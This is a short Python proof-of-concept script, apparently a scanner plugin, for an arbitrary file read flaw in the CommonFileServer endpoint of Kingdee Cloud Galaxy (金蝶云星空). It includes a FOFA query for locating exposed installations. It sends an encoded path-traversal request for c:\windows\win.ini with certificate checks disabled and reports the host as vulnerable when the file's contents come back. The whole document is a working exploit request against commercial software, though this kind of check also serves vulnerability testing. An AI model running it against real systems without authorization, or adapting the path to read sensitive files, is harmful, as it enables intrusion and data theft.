#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://blog.csdn.net/holyxp/article/details/132081476',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '金蝶云星空CommonFileServer任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="金蝶云星空-管理中心"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = r'/CommonFileServer/c%3A%2Fwindows%2Fwin.ini'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      ret['ifbug'] = True
      # ret['huixian'] = res.text
      res.close()
      return ret
    else:
      return ret
  except:
    return ret